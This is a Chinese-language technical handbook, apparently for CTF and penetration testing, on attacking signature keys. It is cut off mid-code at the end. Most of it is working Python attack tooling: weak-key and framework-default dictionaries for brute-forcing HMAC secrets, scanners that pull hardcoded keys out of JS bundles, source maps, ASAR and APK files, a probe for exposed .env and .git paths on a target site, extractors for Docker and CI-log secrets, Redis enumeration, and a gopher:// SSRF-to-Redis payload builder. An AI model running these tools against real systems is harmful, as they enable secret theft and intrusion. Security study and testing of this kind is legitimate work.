# Key Attacks — 签名密钥攻击深度技术手册

> 签名安全 = 密钥机密性。密钥一旦泄露或可预测，所有签名保护归零。本手册覆盖密钥从生成、存储、传递到销毁全生命周期的攻击技术。
>
> **前置阅读**: [01-algorithm.md](01-algorithm.md) (签名算法基础), [02-implementation.md](02-implementation.md) (实现缺陷)

## 0. 密钥攻击全景

```
密钥攻击入口:
┌─────────────────────────────────────────────────────┐
│                  密钥攻击分类                          │
├─────────────┬─────────┬──────────┬─────────┬─────────┤
│  弱密钥      │ 密钥泄露 │ 密钥爆破  │ 密钥重用 │ 密钥预测 │
│  字典攻击    │ 源码/配置│ HMAC暴力 │ 环境/服务│ PRNG/时间│
│  默认密钥    │ 内存/日志│ GPU加速  │ 客户/租户│ 顺序模式 │
│  预测种子    │ CI/CD   │ 在线绕过  │ 沙箱/生产│ 算法弱点 │
└─────────────┴─────────┴──────────┴─────────┴─────────┘
```

---

## 1. 弱密钥字典攻击

### 1.1 Top 100 HMAC 弱密钥

最常见的 HMAC 弱密钥 — 直接在支付回调签名、JWT、webhook 签名验证中被硬编码。

```python
# weak_keys_dict.py — 弱密钥字典 + 自动测试
import hmac
import hashlib
import itertools

# === Top 100 HMAC 弱密钥 (精选) ===
WEAK_KEYS = [
    # --- 空 / 默认值 ---
    "", "secret", "key", "password", "pass", "123456", "12345678",
    "admin", "root", "test", "guest", "user", "default", "null",
    "undefined", "None", "none", "true", "false",

    # --- 框架默认密钥 (详见 1.2) ---
    "base64:xxxxxx...",  # Laravel APP_KEY 占位
    "ChangeMe", "changeme", "CHANGE_ME", "<secret>",

    # --- 常见弱模式 ---
    "secret_key", "secretkey", "secret-key",
    "my_secret", "my-secret", "mysecret",
    "private_key", "privatekey", "private-key",
    "api_key", "apikey", "api-key",
    "app_key", "appkey", "app-key", "app_secret",
    "sign_key", "signkey", "signing_key", "signing-key",
    "hmac_key", "hmackey", "hmac-secret",
    "auth_key", "authkey", "auth-token",
    "token", "token_secret", "token_key",
    "encryption_key", "encryption-key", "encrypt_key",
    "jwt_secret", "jwt-secret", "jwtsecret",
    "session_secret", "session-secret",

    # --- 数字模式 ---
    "111111", "000000", "666666", "888888",
    "1234", "12345", "123456789", "1234567890",
    "qwerty", "qwerty123", "asdfgh", "zxcvbn",
    "abc123", "abc123456", "123abc",
    "password1", "password123", "admin123",
    "test123", "test1234", "test123456",
    "dev", "dev_key", "devkey", "dev-key",
    "debug", "debug_key", "debugkey", "debug-key",

    # --- 常见短语 ---
    "iloveyou", "sunshine", "monkey", "dragon", "master",
    "letmein", "welcome", "welcome123", "hello123",
    "princess", "football", "shadow", "trustno1",
    "superman", "batman", "starwars", "access",
    "passw0rd", "p@ssword", "P@ssw0rd",

    # --- 公司/产品名模式 ---
    "company", "company_secret", "company-key",
    "product", "product_secret", "product-key",
    "service", "service_key", "service-secret",
    "platform", "platform_secret",
    "internal", "internal_key", "internal-secret",
    "staging", "staging_key", "production",
    "production_key", "prod", "prod_key",
]


def test_weak_keys(data: bytes, target_signature: str, method: str = "sha256"):
    """用弱密钥字典测试 HMAC 签名"""
    for key in WEAK_KEYS:
        h = hmac.new(key.encode(), data, getattr(hashlib, method))
        if h.hexdigest() == target_signature:
            print(f"[!] MATCH: key = {repr(key)}")
            return key
    print("[-] No weak key matched")
    return None


def generate_weak_key_cli(data_hex: str, target_sig: str, method: str = "sha256"):
    """命令行入口"""
    data = bytes.fromhex(data_hex)
    return test_weak_keys(data, target_sig, method)


if __name__ == "__main__":
    # 示例: 已知签名为 "abc123..." 时
    import sys
    if len(sys.argv) >= 3:
        generate_weak_key_cli(sys.argv[1], sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "sha256")
    else:
        print("Usage: python weak_keys_dict.py <data_hex> <target_sig> [method]")
```

### 1.2 框架默认密钥

框架生成默认密钥时有规律可循。CTF 题目经常忘记修改默认密钥。

```python
# framework_default_keys.py — 框架默认密钥生成器与测试器
import hashlib, base64, os, json

# === Laravel APP_KEY ===
# 格式: base64:xxxx (随机 32 字节 base64 编码)
# 默认 KEY 出现在: config/app.php, .env
# 如果 KEY 是 "SomeRandomString" 或空 → 漏洞
# 如果 KEY 被 echo 到 debug 页面 → 漏洞

LARAVEL_WEAK_PATTERNS = [
    "SomeRandomString",
    "ChangeMe",
    "<APP_KEY>",
    "base64:SomeRandomString",
    "base64:",
    "",
]

# === Django SECRET_KEY ===
# 默认值: 首次 migrate 时生成
# 但部分自动化部署工具使用固定值
DJANGO_WEAK_PATTERNS = [
    "CHANGEME",
    "change-me",
    "django-insecure-xxxxx",
    # 通过生成算法预测:
    # django.utils.crypto.get_random_string() 使用 random.SystemRandom
    # 安全，但如果部署脚本写死了值，就是漏洞
]

# === Flask secret_key ===
# 默认值: 如果 app.secret_key 未设置
# Flask 1.0+ 在 debug=True 时会自动生成
# 但常见模式是硬编码:
FLASK_WEAK_PATTERNS = [
    "secret",
    "dev",
    "development",
    "supersecret",
    "changethis",
    "flask-secret",
]

# === Express session secret ===
# express-session 的 secret 参数
EXPRESS_WEAK_PATTERNS = [
    "secret",
    "session secret",
    "keyboard cat",  # express-session README 示例
    "keyboard-cat",
    "changeme",
    "session-secret",
    "mysecret",
    "express-session-secret",
]

# === Rails secret_key_base ===
# Rails 4+ 需要 secret_key_base
# 常见错误: 直接拷贝教程中的值
RAILS_WEAK_PATTERNS = [
    "CHANGEME",
    "change_me",
    "secret_key_base",
    "development_secret",
    "test_secret",
]


def test_framework_default_keys(sign_function, test_data: dict):
    """用所有框架默认密钥逐一代入测试"""
    all_keys = []
    for name, patterns in [
        ("Laravel", LARAVEL_WEAK_PATTERNS),
        ("Django", DJANGO_WEAK_PATTERNS),
        ("Flask", FLASK_WEAK_PATTERNS),
        ("Express", EXPRESS_WEAK_PATTERNS),
        ("Rails", RAILS_WEAK_PATTERNS),
    ]:
        for p in patterns:
            all_keys.append((name, p))

    print(f"[*] Testing {len(all_keys)} framework default keys...")
    for framework, key in all_keys:
        result = sign_function(data=test_data, key=key)
        if result:
            print(f"[!] MATCH: {framework} key = {repr(key)}")
            return framework, key
    print("[-] No framework default key matched")
    return None, None


# === 自动化: 从 .env 样本提取密钥 ===
def extract_keys_from_env_sample(env_path: str) -> dict:
    """从 .env 文件提取所有密钥配置项"""
    keys = {}
    with open(env_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if "=" in line:
                k, v = line.split("=", 1)
                if any(secret_word in k.upper() for secret_word in
                       ["KEY", "SECRET", "SALT", "TOKEN", "HASH", "SIGN"]):
                    keys[k.strip()] = v.strip().strip("'\"")
    return keys
```

### 1.3 常见密钥模式生成

```python
# common_key_patterns.py — 从常见模式批量生成密钥
import hashlib, base64, itertools, string
from typing import List

def generate_key_patterns(target_context: str = "") -> List[str]:
    """
    根据目标上下文生成可能的密钥列表

    从这些常见模式生成:
    - base64("secret"), hex("secret"), MD5("secret")
    - base64(target_name), hex(target_name)
    - 域名反转: com.example → com.example.secret
    - 组合: target_secret_2024, target_secret_2025
    """
    keys = []

    # --- 基础词 ---
    base_words = ["secret", "key", "sign", "hmac", "token", "auth",
                  "private", "password", "hash", "salt"]

    # --- base64 编码变体 ---
    # 注意: CTF 中常见 base64("secret") 作为密钥
    for word in base_words:
        keys.append(base64.b64encode(word.encode()).decode())

    # --- hex 编码变体 ---
    for word in base_words:
        keys.append(word.encode().hex())

    # --- MD5 变体 (常见于 PHP 应用) ---
    for word in base_words:
        keys.append(hashlib.md5(word.encode()).hexdigest())

    # --- SHA256 截断 ---
    for word in base_words:
        keys.append(hashlib.sha256(word.encode()).hexdigest()[:16])
        keys.append(hashlib.sha256(word.encode()).hexdigest()[:32])

    # --- 目标上下文组合 ---
    if target_context:
        domain_parts = target_context.replace("https://", "").replace("http://", "").split(".")
        if domain_parts:
            base_name = domain_parts[0] if len(domain_parts) > 0 else target_context
            full_domain = ".".join(domain_parts) if len(domain_parts) > 1 else target_context
            reversed_domain = ".".join(reversed(domain_parts))

            for base in [base_name, full_domain, reversed_domain]:
                for suffix in base_words:
                    keys.append(f"{base}_{suffix}")
                    keys.append(f"{base}-{suffix}")
                    keys.append(f"{base}{suffix.capitalize()}")
                keys.append(base64.b64encode(base.encode()).decode())
                keys.append(hashlib.md5(base.encode()).hexdigest())

    # --- 数字后缀 ---
    numbered = []
    for k in keys[:50]:  # 对前 50 个加数字后缀
        for year in ["2023", "2024", "2025", "2026"]:
            numbered.append(f"{k}{year}")
            numbered.append(f"{k}_{year}")
    keys.extend(numbered)

    # 去重
    return list(dict.fromkeys(keys))


def generate_key_from_env_pattern(env_sample: dict) -> List[str]:
    """从 .env 样本生成可能的密钥变体"""
    results = []
    for k, v in env_sample.items():
        if v and len(v) < 32:
            # 短值可能是明文或占位符
            results.append(v)
            results.append(v.upper())
            results.append(v.lower())
            results.append(v + "==")
            results.append(base64.b64encode(v.encode()).decode())
    return list(dict.fromkeys(results))
```

### 1.4 从可预测种子生成密钥

```python
# predictable_seed_keys.py — 从时间戳、PID 等可预测种子生成密钥
import hashlib, time, os
from datetime import datetime, timedelta
from typing import List

def generate_keys_from_timestamp(
    server_start_estimate: datetime = None,
    window_hours: int = 48
) -> List[str]:
    """
    如果密钥 = md5(secret + timestamp) 或类似模式

    使用服务器启动时间估算 (±window 范围)
    """
    if server_start_estimate is None:
        server_start_estimate = datetime.utcnow()

    keys = []
    for hour_offset in range(-window_hours, window_hours + 1):
        ts = server_start_estimate + timedelta(hours=hour_offset)

        # 常见时间戳格式
        formats = [
            ts.strftime("%Y-%m-%d"),
            ts.strftime("%Y%m%d"),
            ts.strftime("%Y-%m-%d %H:%M:%S"),
            ts.strftime("%Y-%m-%d-%H"),
            str(int(ts.timestamp())),
            str(int(ts.timestamp() * 1000)),
        ]
        for fmt in formats:
            keys.append(hashlib.md5(fmt.encode()).hexdigest())
            keys.append(f"secret_{fmt}")
            keys.append(f"key_{fmt}")

    return list(dict.fromkeys(keys))


def generate_keys_from_pid_range(pid_range: range = range(1, 65536)) -> List[str]:
    """
    如果密钥使用了 PID (进程号)

    常见模式: key = md5("secret" + str(getpid()))
    """
    keys = []
    for pid in [1, 100, 500, 1000, 1234, 4321, 8888, 9999, 32768, 65535]:
        keys.append(hashlib.md5(f"secret{pid}".encode()).hexdigest())
        keys.append(f"key_{pid}")
        keys.append(f"secret_{pid:04d}")
    # 更多: 可以在确定 PID 范围后生成
    return keys


def generate_keys_from_combined_seed() -> List[str]:
    """
    PHP mt_rand + srand(time()) 场景

    如果密钥 = md5(mt_rand()) 或 md5(mt_rand() + mt_rand())
    php_mt_seed 工具可以反推种子
    """
    # 这里只列典型案例
    keys = []
    for i in range(100):
        keys.append(hashlib.md5(str(i).encode()).hexdigest())
        keys.append(hashlib.md5(str(i * 10000).encode()).hexdigest())
    return keys
```

---

## 2. 密钥泄露源

### 2.1 源码泄露

#### JS Bundle 硬编码密钥

```python
# js_key_scanner.py — 从 JavaScript bundle 扫描硬编码密钥
import re, json, base64, os
from typing import List, Dict, Set

# 密钥模式正则 (覆盖多种格式)
KEY_PATTERNS = [
    # HMAC/JWT 密钥
    re.compile(r'["\'](?:secret|key|token|sign|hmac|jwt)[\s_\-]*(?:key|secret)?["\']\s*[:=]\s*["\']([^"\']{8,})["\']', re.I),
    re.compile(r'["\'](?:hmac|sign(?:ing)?|secret|private|api)_?key["\']\s*[:=]\s*["\']([^"\']{8,})["\']', re.I),

    # SHA256/SHA512 hex 密钥 (64 或 128 hex 字符)
    re.compile(r'["\'][0-9a-fA-F]{64}["\']'),
    re.compile(r'["\'][0-9a-fA-F]{128}["\']'),

    # base64 编码密钥 (长度 >= 20)
    re.compile(r'["\']([A-Za-z0-9+/=]{20,})["\']'),

    # Hex 编码密钥 (32+ hex chars)
    re.compile(r'["\']([0-9a-fA-F]{32,})["\']'),

    # app_key / app_secret 变体
    re.compile(r'(?:app|api|client)[_\s\-]?(?:key|secret|token)\s*[:=]\s*["\']([^"\']{8,})["\']', re.I),

    # 配置对象
    re.compile(r'secret\s*:\s*["\']([^"\']+)["\']', re.I),
    re.compile(r'apiKey\s*:\s*["\']([^"\']+)["\']', re.I),
    re.compile(r'apiSecret\s*:\s*["\']([^"\']+)["\']', re.I),
]

# 过滤掉明显的非密钥值
KEY_FALSE_POSITIVES = {
    "undefined", "null", "true", "false", "none", "nil", "None",
    "function", "()", "require", "module", "exports",
}

# 常见的 "密钥" 但实际是代码逻辑的 false positive 模式
KEY_SUSPICIOUS_PATTERNS = [
    re.compile(r'[\dA-Fa-f]{32,}'),    # 32+ hex chars
    re.compile(r'^[A-Za-z0-9+/]{20,}={0,2}$'),  # base64-ish
]


def scan_js_file(filepath: str) -> List[Dict]:
    """扫描单个 JS 文件中的密钥"""
    results = []
    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    for pattern in KEY_PATTERNS:
        for match in pattern.finditer(content):
            value = match.group(1) if match.lastindex else match.group(0).strip("'\"")
            if value in KEY_FALSE_POSITIVES:
                continue

            # 跳过太短的值
            if len(value) < 8:
                continue

            line_start = max(0, match.start() - 100)
            context = content[line_start:match.end() + 100].replace("\n", " ")
            line_no = content[:match.start()].count("\n") + 1

            results.append({
                "file": filepath,
                "line": line_no,
                "match": value[:80] + ("..." if len(value) > 80 else ""),
                "length": len(value),
                "context": context[:200],
            })

    # 行号去重
    seen = set()
    unique = []
    for r in results:
        dedup_key = (r["file"], r["line"], r["match"][:20])
        if dedup_key not in seen:
            seen.add(dedup_key)
            unique.append(r)
    return unique


def scan_js_directory(directory: str) -> List[Dict]:
    """扫描整个 JS 目录"""
    all_keys = []
    for root, dirs, files in os.walk(directory):
        for fname in files:
            if fname.endswith((".js", ".jsx", ".ts", ".tsx", ".vue", ".min.js")):
                path = os.path.join(root, fname)
                try:
                    all_keys.extend(scan_js_file(path))
                except Exception:
                    pass
    return all_keys
```

#### Source Map (.map) 泄露

```python
# sourcemap_extractor.py — 从 source map 恢复原始源码并提取密钥
import requests, json, base64, re, zlib, gzip
from io import BytesIO

def fetch_sourcemap(js_url: str) -> dict:
    """
    从 JS bundle URL 获取 source map

    策略:
    1. 尝试 URL + ".map"
    2. 尝试从 JS 末尾的 //# sourceMappingURL= 提取
    3. 尝试常见路径: /static/js/main.xxx.js.map
    """
    # 策略1: 直接拼接 .map
    map_url = js_url + ".map"
    r = requests.get(map_url, timeout=10)
    if r.status_code == 200:
        try:
            return r.json()
        except json.JSONDecodeError:
            pass

    # 策略2: 从 JS 中提取 sourceMappingURL
    r = requests.get(js_url, timeout=10)
    if r.status_code == 200:
        match = re.search(r'//#\s*sourceMappingURL=(.+\.map)', r.text)
        if match:
            map_path = match.group(1)
            if map_path.startswith("http"):
                map_url = map_path
            else:
                # 相对路径
                base = js_url.rsplit("/", 1)[0]
                map_url = f"{base}/{map_path}"
            r2 = requests.get(map_url, timeout=10)
            if r2.status_code == 200:
                try:
                    return r2.json()
                except json.JSONDecodeError:
                    pass
    return {}


def extract_keys_from_sourcemap(map_data: dict) -> list:
    """从 source map 的 sourcesContent 中提取密钥"""
    keys = []
    sources = map_data.get("sourcesContent", [])

    for idx, content in enumerate(sources):
        if not content:
            continue

        # 搜索密钥模式
        for pattern in KEY_PATTERNS:
            for match in pattern.finditer(content):
                value = match.group(1) if match.lastindex else match.group(0).strip("'\"")
                if len(value) >= 8 and value not in KEY_FALSE_POSITIVES:
                    source_name = map_data.get("sources", [f"unknown-{idx}"])[idx]
                    keys.append({
                        "source": source_name,
                        "key": value[:80],
                        "length": len(value),
                        "context": content[
                            max(0, match.start() - 60):
                            match.end() + 60
                        ].replace("\n", " ")[:200],
                    })
                    break  # 一个 source 只取第一个命中
    return keys


def scan_js_sourcemap_chain(entry_url: str) -> list:
    """
    入口 URL → 找 JS bundle → 找 source map → 提取密钥
    自动跟随 import() 动态加载的 chunk
    """
    all_keys = []
    visited = set()
    queue = [entry_url]

    while queue:
        url = queue.pop(0)
        if url in visited:
            continue
        visited.add(url)

        # 尝试 source map
        map_data = fetch_sourcemap(url)
        if map_data:
            keys = extract_keys_from_sourcemap(map_data)
            all_keys.extend(keys)
            print(f"[+] {url}: {len(keys)} keys found via sourcemap")

        # 检查 JS 内容中的 import()
        r = requests.get(url, timeout=10)
        if r.status_code == 200:
            for m in re.finditer(r'import\(["\']([^"\']+)["\']\)', r.text):
                chunk_url = m.group(1)
                if not chunk_url.startswith("http"):
                    base = url.rsplit("/", 1)[0]
                    chunk_url = f"{base}/{chunk_url}"
                queue.append(chunk_url)

    return all_keys


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        results = scan_js_sourcemap_chain(sys.argv[1])
        print(f"\n[=] Total keys found: {len(results)}")
        for r in results[:20]:
            print(f"    {r['source']}: {r['key']}")
```

#### Electron ASAR 提取

```python
# asar_extract_keys.py — 从 Electron ASAR 包提取源码并扫描密钥
import os, json, struct, io
from typing import List, Dict

def parse_asar_header(asar_path: str) -> dict:
    """
    ASAR 文件格式: 4 bytes header size (JSON) + JSON header + file data
    解析 header 得到文件树
    """
    with open(asar_path, "rb") as f:
        # 前 4 字节: header 大小 (little-endian uint32)
        header_size_bytes = f.read(4)
        if len(header_size_bytes) < 4:
            return {}
        header_size = struct.unpack("<I", header_size_bytes)[0]

        # 读取 header JSON
        header_json = f.read(header_size).decode("utf-8")
        return json.loads(header_json)


def extract_asar_file(asar_path: str, file_path: str) -> bytes:
    """从 ASAR 中提取单个文件的内容"""
    header = parse_asar_header(asar_path)
    if not header:
        return b""

    # 导航文件树
    node = header
    for part in file_path.split("/"):
        files = node.get("files", {})
        if part in files:
            node = files[part]
        elif "**" in files:
            # wildcard node
            node = files["**"]
        else:
            return b""

    if "offset" not in node or "size" not in node:
        # 目录 node，不是文件
        return b""

    offset = int(node["offset"])
    size = node["size"]

    with open(asar_path, "rb") as f:
        header_size = 4 + len(json.dumps(header).encode()) + 4  # 粗略估计
        f.seek(header_size + offset, io.SEEK_SET)
        return f.read(size)


def scan_asar_for_keys(asar_path: str) -> List[Dict]:
    """扫描整个 ASAR 包中的密钥"""
    keys = []

    # 先遍历所有 JS/JSON 文件
    app_code = {}
    header = parse_asar_header(asar_path)

    def traverse(node, prefix=""):
        for name, child in node.get("files", {}).items():
            path = f"{prefix}/{name}" if prefix else name
            if "files" in child:
                traverse(child, path)
            elif name.endswith((".js", ".ts", ".jsx", ".json")):
                try:
                    content = extract_asar_file(asar_path, path)
                    app_code[path] = content.decode("utf-8", errors="ignore")
                except Exception:
                    pass

    traverse(header)

    # 扫描每个文件
    for path, content in app_code.items():
        for pattern in KEY_PATTERNS:
            for match in pattern.finditer(content):
                value = match.group(1) if match.lastindex else match.group(0).strip("'\"")
                if len(value) >= 8 and value not in KEY_FALSE_POSITIVES:
                    keys.append({
                        "file": path,
                        "key": value[:80],
                        "length": len(value),
                    })
                    break

    return keys
```

#### 移动 APK 字符串

```python
# apk_key_scanner.py — 从 APK 的 strings 中提取密钥
import subprocess, re, json, os, tempfile, zipfile

def scan_apk_strings_for_keys(apk_path: str) -> list:
    """
    用 strings 命令提取 APK 中所有字符串后扫描密钥

    也可以直接读取 APK (ZIP) 中的 classes*.dex, resources.arsc
    """
    keys = []

    # 方法1: 全局 strings
    result = subprocess.run(
        ["strings", apk_path],
        capture_output=True, text=True, timeout=60
    )
    for line in result.stdout.split("\n"):
        line = line.strip()
        # 过滤条件: 8-128 字符, 非纯数字, 包含字母
        if 8 <= len(line) <= 128 and not line.isdigit() and re.search(r'[a-zA-Z]', line):
            for pattern in KEY_PATTERNS:
                m = pattern.search(f'"{line}"')
                if m:
                    keys.append({
                        "source": "strings",
                        "key": line[:80],
                        "length": len(line),
                    })
                    break

    # 方法2: 从 APK 中的 JS bundle 提取
    with zipfile.ZipFile(apk_path, "r") as z:
        for name in z.namelist():
            if name.endswith((".js", ".html")):
                try:
                    content = z.read(name).decode("utf-8", errors="ignore")
                    for pattern in KEY_PATTERNS:
                        for m in pattern.finditer(content):
                            value = m.group(1) if m.lastindex else m.group(0).strip("'\"")
                            if len(value) >= 8 and value not in KEY_FALSE_POSITIVES:
                                keys.append({
                                    "source": f"apk:{name}",
                                    "key": value[:80],
                                    "length": len(value),
                                })
                except Exception:
                    pass

    return keys
```

### 2.2 配置文件泄露

#### .env 暴露攻击

```python
# env_exposure_scan.py — 扫描 .env 泄露端点
import requests
from urllib.parse import urljoin

ENV_PATHS = [
    "/.env",
    "/.env.backup",
    "/.env.bak",
    "/.env.old",
    "/.env.local",
    "/.env.production",
    "/.env.development",
    "/.env.staging",
    "/.env.example",
    "/.env.sample",
    "/.env.dist",
    "/env",
    "/env.txt",
    "/config/.env",
    "/api/.env",
    "/backend/.env",
    "/.config/.env",
    "/app/.env",
    "/src/.env",
    "/application/config/.env",
    "/.env.save",
    "/.env.swp",
]

GIT_CONFIG_PATHS = [
    "/.git/config",
    "/.git/HEAD",
    "/.gitignore",
    "/.git/logs/HEAD",
    "/.git/refs/heads/master",
    "/.git/config.bak",
]

# Laravel debug 页面泄露 KEY 的模式
LARAVEL_DEBUG_PATHS = [
    "/_debugbar/",
    "/debugbar",
    "/debug",
    "/whoops",
    "/error",
    "/app.php",
    "/config/app.php",
]


def scan_env_exposure(base_url: str, verbose: bool = True) -> dict:
    """全面扫描 .env 和相关配置泄露"""
    results = {"env": [], "git": [], "laravel_debug": []}

    # --- .env 扫描 ---
    for path in ENV_PATHS:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, timeout=10, allow_redirects=False)
            if r.status_code == 200:
                # 检查是否有 env 关键字特征
                text = r.text
                flags = {
                    "APP_KEY": "APP_KEY" in text,
                    "DB_PASSWORD": "DB_PASSWORD" in text,
                    "SECRET": "SECRET" in text or "secret" in text,
                    "API_KEY": "API_KEY" in text or "api_key" in text,
                    "AWS": "AWS_" in text,
                    "JWT": "JWT" in text,
                }
                if any(flags.values()) or "=" in text:
                    results["env"].append({
                        "url": url,
                        "status": r.status_code,
                        "size": len(text),
                        "flags": [k for k, v in flags.items() if v],
                        "preview": text[:500],
                    })
                    if verbose:
                        print(f"[!] .env FOUND: {url}")
        except requests.RequestException:
            pass

    # --- .git/config 扫描 ---
    for path in GIT_CONFIG_PATHS:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, timeout=10, allow_redirects=False)
            if r.status_code == 200 and len(r.text) > 10:
                results["git"].append({
                    "url": url,
                    "status": r.status_code,
                    "preview": r.text[:500],
                })
                if verbose:
                    print(f"[!] GIT FOUND: {url}")
        except requests.RequestException:
            pass

    # --- Laravel debug 页面 ---
    for path in LARAVEL_DEBUG_PATHS:
        url = urljoin(base_url, path)
        try:
            r = requests.get(url, timeout=10, allow_redirects=False)
            if r.status_code == 200:
                if "APP_KEY" in r.text or "Whoops" in r.text or "Debugbar" in r.text:
                    results["laravel_debug"].append({
                        "url": url,
                        "preview": r.text[:500],
                    })
                    # 直接提取 APP_KEY
                    m = re.search(r'APP_KEY["\']?\s*[:=]\s*["\']?([^"\'<\s]+)', r.text)
                    if m:
                        if verbose:
                            print(f"[!] APP_KEY leaked: {m.group(1)}")
        except requests.RequestException:
            pass

    return results


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        r = scan_env_exposure(sys.argv[1])
        print(f"\n[=] Results:")
        print(f"    .env: {len(r['env'])} found")
        print(f"    .git: {len(r['git'])} found")
        print(f"    Laravel debug: {len(r['laravel_debug'])} found")
```

#### Docker 环境变量

```python
# docker_env_extract.py — 从 Docker 场景提取密钥
import docker  # docker-py
from typing import List, Dict

def inspect_container_env(container_id_or_name: str) -> Dict[str, str]:
    """通过 Docker API 检查容器的环境变量"""
    client = docker.from_env()
    container = client.containers.get(container_id_or_name)
    env_vars = {}

    # 从容器 inspect 中提取 Env
    for env_line in container.attrs.get("Config", {}).get("Env", []):
        if "=" in env_line:
            k, v = env_line.split("=", 1)
            env_vars[k] = v

    return env_vars


def extract_secrets_from_env_vars(env_vars: Dict[str, str]) -> List[Dict]:
    """从环境变量字典中提取密钥"""
    secrets = []
    secret_keys = ["KEY", "SECRET", "TOKEN", "PASSWORD", "SALT", "SIGN",
                   "CREDENTIAL", "CIPHER", "AUTH", "API_KEY", "APP_KEY",
                   "HASH", "HMAC", "JWT", "ENCRYPT"]

    for k, v in env_vars.items():
        upper_k = k.upper()
        for sk in secret_keys:
            if sk in upper_k:
                secrets.append({
                    "key": k,
                    "value_preview": v[:60] + ("..." if len(v) > 60 else ""),
                    "length": len(v),
                })
                break

    return secrets


def dump_container_env(target_host: str, container_name: str = None):
    """远程 Docker API 提取 (如果暴露了 TCP socket)"""
    import subprocess
    cmd = ["docker", "-H", target_host, "inspect"]
    if container_name:
        cmd.append(container_name)

    result = subprocess.run(cmd + ["--format", "{{json .Config.Env}}"],
                            capture_output=True, text=True, timeout=30)
    if result.returncode == 0:
        env_list = json.loads(result.stdout)
        env_vars = {}
        for item in env_list:
            if "=" in item:
                k, v = item.split("=", 1)
                env_vars[k] = v
        return extract_secrets_from_env_vars(env_vars)
    return []
```

#### CI/CD 日志泄露

```python
# ci_log_key_extractor.py — 从 CI/CD 日志提取密钥

GITHUB_ACTION_LOG_PATTERNS = [
    r"(?:secret|key|token|password)\s*[:=]\s*['\"]?(\S+)",
    r"::set-secret\s+",
    r"::add-mask\s+",
    r"run:\s+.*\$\{\{\s*secrets\.\w+\s*\}\}",
    r"env:\s*\n\s+\w+:\s+\$\{\{\s*secrets\.\w+\s*\}\}",
]

GITLAB_CI_LOG_PATTERNS = [
    r"\[masked\]",  # GitLab 掩盖后的值
    r"\$\w+_SECRET\b",
    r"\$\w+_KEY\b",
    r"\$\w+_TOKEN\b",
    r"\$\{CI_\w+\}",  # GitLab 预定义变量
]


def check_ci_log_for_exposure(log_content: str) -> list:
    """
    分析 CI/CD 日志中的密钥泄露

    注意: GitHub 和 GitLab 会对已标记的 secret 做 masking
    但漏标、第三方 action、debug 模式都可能导致泄露
    """
    findings = []

    # GitHub Actions
    for pattern in GITHUB_ACTION_LOG_PATTERNS:
        for m in re.finditer(pattern, log_content, re.I | re.M):
            findings.append({
                "type": "github_actions",
                "match": m.group()[:100],
                "position": m.start(),
            })

    # GitLab CI
    for pattern in GITLAB_CI_LOG_PATTERNS:
        for m in re.finditer(pattern, log_content, re.I | re.M):
            findings.append({
                "type": "gitlab_ci",
                "match": m.group()[:100],
                "position": m.start(),
            })

    return findings


def extract_keys_from_build_log(log_url: str) -> dict:
    """
    从公开 CI/CD build log 中提取密钥

    示例: 公共 GitHub Actions log
    https://github.com/owner/repo/actions/runs/123456/jobs/789012
    """
    r = requests.get(log_url, timeout=30)
    if r.status_code != 200:
        return {"error": f"HTTP {r.status_code}"}

    findings = check_ci_log_for_exposure(r.text)

    # 更进一步: 搜索常见的 KEY=value 模式
    key_value_pattern = re.compile(
        r'^(?:export\s+)?'
        r'(?:\w*(?:SECRET|KEY|TOKEN|PASSWORD|SALT|SIGN|AUTH)\w*)\s*=\s*["\']?(\S+)["\']?',
        re.I | re.M
    )
    for m in key_value_pattern.finditer(r.text):
        value = m.group(1)
        # 过滤掉 shell 命令、路径等
        if not value.startswith(("/", "$", "#", "`")):
            findings.append({
                "type": "env_var_leak",
                "match": m.group()[:120],
                "position": m.start(),
            })

    return {
        "log_url": log_url,
        "total_findings": len(findings),
        "findings": findings[:50],
    }
```

### 2.3 内存/存储泄露

#### Redis 密钥枚举

```python
# redis_key_enum.py — 从 Redis 提取密钥信息
import redis
from typing import List, Dict

def try_redis_connect(host: str, port: int = 6379, password: str = "", timeout: int = 5) -> bool:
    """尝试连接 Redis，如果无密码或弱密码则成功"""
    try:
        r = redis.Redis(host=host, port=port, password=password or None,
                        socket_connect_timeout=timeout, socket_timeout=timeout)
        r.ping()
        return True
    except (redis.ConnectionError, redis.AuthenticationError, TimeoutError):
        return False


def enumerate_redis_keys(host: str, port: int = 6379, password: str = "",
                         key_pattern: str = "*",
                         max_keys: int = 10000) -> Dict[str, str]:
    """
    枚举 Redis 中的密钥相关条目

    Redis SSRF 是 CTF 常见入口: gopher:// 或 SSRF → Redis
    """
    r = redis.Redis(host=host, port=port, password=password or None,
                    socket_connect_timeout=5, socket_timeout=10)

    secrets = {}

    # 使用 SCAN 遍历所有 key (避免 KEYS 阻塞)
    cursor = 0
    count = 0
    while count < max_keys:
        cursor, keys = r.scan(cursor=cursor, match=key_pattern, count=100)
        for key in keys:
            key_str = key.decode() if isinstance(key, bytes) else key
            key_type = r.type(key).decode()

            # 关注包含 secret/key/token 的 key
            if any(w in key_str.lower() for w in ["secret", "key", "token",
                                                    "pass", "auth", "jwt",
                                                    "sign", "hmac", "session"]):
                try:
                    if key_type == "string":
                        val = r.get(key)
                        val_str = val.decode() if isinstance(val, bytes) else str(val)
                        secrets[key_str] = val_str[:200]
                    elif key_type == "hash":
                        hash_data = r.hgetall(key)
                        decoded = {}
                        for hk, hv in hash_data.items():
                            decoded[hk.decode()] = hv.decode()[:100]
                        secrets[key_str] = decoded
                except Exception:
                    pass
            count += 1
        if cursor == 0:
            break

    return secrets


def redis_ssrf_gopher_payload(target_redis: str, commands: List[str]) -> str:
    """
    生成 gopher:// payload 用于 SSRF → Redis 攻击

    ref: https://github.com/tarunkant/Gopherus
    """
    payload = "gopher://" + target_redis + "/_"
    for cmd in commands:
        # Redis RESP 协议: *n\r\n$len\r\ncmd\r\n
        parts = cmd.split()
        resp = f"*{len(parts)}\r\n"
        for p in parts:
            resp += f"${len(p)}\r\n{p}\r\n"
        payload += resp.replace("\n", "%0a").replace("\r", "%0d")
    return payload


# 示例: SSRF → Redis → 读取密钥
SSRF_REDIS_PAYLOADS = {
    "info": "INFO",
    "config_get": "CONFIG GET *",
    "keys_secret": "KEYS *secret*",
